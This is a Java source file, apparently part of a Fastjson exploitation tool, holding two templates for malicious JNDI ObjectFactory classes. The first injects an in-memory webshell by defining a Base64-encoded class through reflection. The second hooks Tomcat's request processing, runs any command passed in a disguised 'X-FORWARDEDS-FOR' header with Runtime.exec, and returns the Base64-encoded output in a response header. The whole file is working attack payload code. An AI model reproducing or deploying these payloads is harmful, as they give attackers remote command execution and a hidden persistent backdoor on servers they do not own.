package com.fastjsontool.exploit.payload;

public class Modules {
    /**
     * 模板类，生成jndi服务载荷
     */

    /**
     * 注入内存马的模板
     */
    private static String shell = "import javax.naming.Context;\n" +
            "import javax.naming.Name;\n" +
            "import javax.naming.spi.ObjectFactory;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.Base64;\n" +
            "import java.util.Hashtable;\n" +
            "\n" +
            "public class %s  implements ObjectFactory {\n" +
            "    @Override\n" +
            "    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {\n" +
            "        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "        String str = \"\";\n" +
            "        byte[] decode = Base64.getDecoder().decode(str);\n" +
            "        try {\n" +
            "            Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "            Method defineClass = aClass.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n" +
            "            defineClass.setAccessible(true);\n" +
            "            Class zhangsan=null;\n" +
            "            try {\n" +
            "                zhangsan = Class.forName(new String(Base64.getDecoder().decode(\"YWRkRGVtbw==\")));\n" +
            "            }catch (Exception e){}\n" +
            "            if(zhangsan!=null){\n" +
            "                zhangsan.newInstance();\n" +
            "            }else {\n" +
            "                Object o = ((Class) defineClass.invoke(clzLoader, new String(Base64.getDecoder().decode(\"YWRkRGVtbw==\")), decode, 0, decode.length)).newInstance();\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "}";

    /**
     * 执行命令的模板
     */
    private static String cmd = "import org.apache.catalina.connector.Connector;\n" +
            "import org.apache.catalina.core.ApplicationContext;\n" +
            "import org.apache.catalina.core.StandardContext;\n" +
            "import org.apache.catalina.core.StandardService;\n" +
            "import org.apache.coyote.RequestInfo;\n" +
            "import javax.naming.Context;\n" +
            "import javax.naming.Name;\n" +
            "import javax.naming.spi.ObjectFactory;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.InputStream;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.InvocationTargetException;\n" +
            "import java.util.Base64;\n" +
            "import java.util.Hashtable;\n" +
            "\n" +
            "public class %s implements ObjectFactory {\n" +
            "    @Override\n" +
            "    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n" +
            "        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
            "        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();\n" +
            "        org.apache.catalina.connector.Response response = null;\n" +
            "        try {\n" +
            "            Field context = Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredField(\"context\");\n" +
            "            context.setAccessible(true);\n" +
            "            ApplicationContext ApplicationContext = (ApplicationContext) context.get(standardContext);\n" +
            "            Field service = Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredField(\"service\");\n" +
            "            service.setAccessible(true);\n" +
            "            StandardService standardService = (StandardService) service.get(ApplicationContext);\n" +
            "            Field connectors = Class.forName(\"org.apache.catalina.core.StandardService\").getDeclaredField(\"connectors\");\n" +
            "            connectors.setAccessible(true);\n" +
            "            Connector[] connector = (Connector[]) connectors.get(standardService);\n" +
            "            Field protocolHandler = Class.forName(\"org.apache.catalina.connector.Connector\").getDeclaredField(\"protocolHandler\");\n" +
            "            protocolHandler.setAccessible(true);\n" +
            "            Class<?>[] AbstractProtocol_list = Class.forName(\"org.apache.coyote.AbstractProtocol\").getDeclaredClasses();\n" +
            "            for (Class<?> aClass : AbstractProtocol_list) {\n" +
            "                if (aClass.getName().length() == 52) {\n" +
            "                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\", null);\n" +
            "                    getHandlerMethod.setAccessible(true);\n" +
            "                    Field globalField = aClass.getDeclaredField(\"global\");\n" +
            "                    globalField.setAccessible(true);\n" +
            "                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));\n" +
            "                    Field processors = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\");\n" +
            "                    processors.setAccessible(true);\n" +
            "                    java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);\n" +
            "                    Field req = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\");\n" +
            "                    req.setAccessible(true);\n" +
            "                    for (RequestInfo requestInfo : RequestInfo_list) {\n" +
            "                        org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);\n" +
            "                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);\n" +
            "                        response = request2.getResponse();\n" +
            "                        String header = null;\n" +
            "                        try {\n" +
            "                            header = request2.getHeader(\"X-FORWARDEDS-FOR\");\n" +
            "                        }catch (Exception e){\n" +
            "                            header = \"informations\";\n" +
            "                        }\n" +
            "                        if (!header.equals(\"informations\") && !header.equals(\"\")) {\n" +
            "                            byte[] encode;\n" +
            "                            try {\n" +
            "                                Runtime runtime = Runtime.getRuntime();\n" +
            "                                String[] commonds = header.split(\"\\\\s+\");\n" +
            "                                Process exec = runtime.exec(commonds);\n" +
            "                                exec.waitFor();\n" +
            "                                InputStream inputStream = exec.getInputStream();\n" +
            "                                byte[] bytes = new byte[1024];\n" +
            "                                int len = 0;\n" +
            "                                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n" +
            "                                while ((len = inputStream.read(bytes)) != -1) {\n" +
            "                                    outputStream.write(bytes, 0, len);\n" +
            "                                }\n" +
            "                                encode = Base64.getEncoder().encode(outputStream.toByteArray());\n" +
            "                                if (encode.length > 0) {\n" +
            "                                    response.setHeader(\"informations\", new String(encode));\n" +
            "                                }else{\n" +
            "                                    response.setHeader(\"informations\", \"execError\");\n" +
            "                                }\n" +
            "                            } catch (Exception e) {\n" +
            "                                response.setHeader(\"informations\", \"execError\");\n" +
            "                            }\n" +
            "                        } else {\n" +
            "                            response.setHeader(\"informations\", \"fastjson\");\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (NoSuchFieldException | InvocationTargetException | IllegalAccessException | NoSuchMethodException | ClassNotFoundException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "}";
}
